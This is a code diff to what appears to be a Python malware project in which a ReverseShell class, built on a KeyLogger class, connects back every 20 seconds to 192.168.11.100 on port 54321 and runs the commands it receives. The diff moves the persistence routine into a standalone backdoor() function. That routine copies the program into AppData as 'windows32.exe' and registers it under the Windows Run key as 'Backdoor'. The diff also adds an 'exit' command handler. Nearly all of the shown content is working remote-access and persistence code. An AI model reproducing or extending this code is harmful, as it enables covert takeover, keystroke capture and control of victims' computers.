@@ -22,22 +22,13 @@ class ReverseShell(KeyLogger):
 
     def __init__(self):
         super().__init__()
-        self.location = f'{environ["appdata"]}\\windows32.exe'
         self.sock = socket(AF_INET, SOCK_STREAM)
-        self.ip = '192.168.11.100'
-        self.port = 54321
-
-    def backdoor(self):
-        if not path.exists(self.location):
-            copyfile(executable, self.location)
-            call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
-                 f'Run /v Backdoor /t REG_SZ /d {self.location}', shell=True)
 
     def connect(self):
         while True:
             sleep(20)
             try:
-                self.sock.connect((self.ip, self.port))
+                self.sock.connect(("192.168.11.100", 54321))
                 self.shell()
             except ConnectionRefusedError:
                 self.connect()
@@ -139,6 +130,9 @@ class ReverseShell(KeyLogger):
         while True:
             command = self.safe_recv()
             if command == 'quit':
+                continue
+            elif command == "exit":
+                self.sock.close()
                 break
             elif command[:2] == 'cd':
                 try:
@@ -163,10 +157,17 @@ class ReverseShell(KeyLogger):
                 self.return_proc(command)
 
 
+def backdoor():
+    location = f'{environ["appdata"]}\\windows32.exe'
+    if not path.exists(location):
+        copyfile(executable, location)
+        call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
+             f'Run /v Backdoor /t REG_SZ /d {location}', shell=True)
+
+
 def main():
-    rev_shell = ReverseShell()
-    rev_shell.backdoor()
-    rev_shell.connect()
+    backdoor()
+    ReverseShell().connect()
 
 
 if __name__ == '__main__':
